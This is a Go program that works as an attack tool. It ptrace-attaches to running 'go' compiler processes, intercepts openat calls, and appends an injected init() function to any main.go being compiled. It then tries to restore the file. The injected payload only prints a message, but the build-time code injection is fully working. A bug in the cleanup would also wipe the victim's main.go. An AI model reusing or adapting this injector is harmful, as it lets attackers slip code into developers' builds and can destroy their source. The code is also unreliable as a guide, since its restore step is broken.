package main

import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	sec "github.com/seccomp/libseccomp-golang"
)

const hackerstring string = `
func init() {
	fmt.Println("Your code is hacked")
}
	`

type target struct {
	pid         int
	cleanSource []byte
	path        string
}

var targets []target

func (t target) patch() error {
	log.Printf("Patching %s", t.path)

	data, err := ioutil.ReadFile(t.path)
	if err != nil {
		log.Printf("Error Reading file %v", err)
		return err
	}

	// add init function
	f, err := os.OpenFile(t.path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error Opening File, %v", err)
		return err
	}

	if _, err := f.WriteString(hackerstring); err != nil {
		log.Printf("Error writing to file, %v", err)
	}

	t.cleanSource = data
	return nil
}

func (t target) clean() error {
	log.Printf("Cleaning %s", t.path)
	syscall.PtraceDetach(t.pid)

	f, err := os.OpenFile(t.path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Printf("Error opening file %v", err)
		return err
	}

	_, err = f.Write(t.cleanSource)
	if err != nil {
		log.Printf("Error writing file %v", err)
		return err
	}

	err = f.Close()
	if err != nil {
		log.Printf("Error closing file %v", err)
		return err
	}
	return nil
}

func (t target) trace() error {
	regs := syscall.PtraceRegs{}
	exit := true
	pid := t.pid

	err := syscall.PtraceAttach(pid)
	if err != nil {
		log.Printf("Error attaching, %v", err)
		return err
	}

	for {
		if exit {
			err = syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				log.Printf("Error gettings regs for pid: %d, %v", pid, err)
				return err

			}

			name, err := sec.ScmpSyscall(regs.Orig_rax).GetName()
			if err != nil {
				log.Printf("Error gettings name, %v", err)
				return err
			}
			if name == "openat" {

				path, err := getOpenAtPath(pid, regs)
				if err != nil {
					fmt.Println(err)
				}
				t.path = path

				if strings.Contains(path, "main.go") {
					fmt.Printf("Path: %s\n", t.path)
					fmt.Printf("Name: %s\n", name)
					err = t.patch()
					if err != nil {
						log.Printf("Error patching file, %v", err)
						return err
					}

				}
			}

		}
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			log.Printf("Error, %v", err)
			return err
		}

		_, err = syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			log.Printf("Error, %v", err)
			return err
		}

		exit = !exit

	}
}

func main() {
	log.Printf("Starting")
	targets = []target{}
	c := make(chan os.Signal)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		os.Exit(1)
	}()

	findproc()

	//Main control loop
	for {
		//Loop through list of exploit targets and clean up
		for idx, xpl := range targets {
			_, err := ps.FindProcess(xpl.pid)
			if err != nil {
				log.Printf("Cleaning Target %d", xpl.pid)

				targets = removeIndex(targets, idx)

			}

		}
		//find new targets
		findproc()

	}
}

func findproc() {
	procs, err := ps.Processes()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, proc := range procs {
		if proc.Executable() == "go" {

			log.Printf("Found Target, %d", proc.Pid())

			eh, _ := os.FindProcess(proc.Pid())
			newTarget := target{
				pid: eh.Pid,
			}
			targets = append(targets, newTarget)
			newTarget.trace()
			newTarget.clean()

		}
	}
}

func getOpenAtPath(pid int, regs syscall.PtraceRegs) (string, error) {
	path, err := readString(pid, uintptr(regs.Rsi))
	if err != nil {
		return "", err
	}
	return path, nil
}

func readString(pid int, addr uintptr) (string, error) {
	data := make([]byte, 4096)
	bytes_copied, _ := syscall.PtracePeekData(pid, addr, data)
	if bytes_copied == 0 {
		return "", fmt.Errorf("0-byte string returned")
	}
	str := C.GoString((*C.char)(C.CBytes(data)))
	return str, nil
}

func contains(s []int, e int) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

func removeIndex(s []target, index int) []target {
	return append(s[:index], s[index+1:]...)
}

func init() {
	fmt.Println("Your code is hacked")
}
